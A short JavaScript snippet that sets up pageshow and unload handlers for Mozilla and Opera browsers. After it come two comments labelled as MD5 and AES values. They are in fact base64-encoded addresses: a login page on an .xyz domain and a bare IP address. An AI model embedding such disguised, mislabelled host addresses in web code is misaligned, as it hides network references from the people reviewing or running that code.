if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:d3d3LmZ0eHM2Ni54eXovaW5kZXgvbG9naW4vbG9naW4uaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/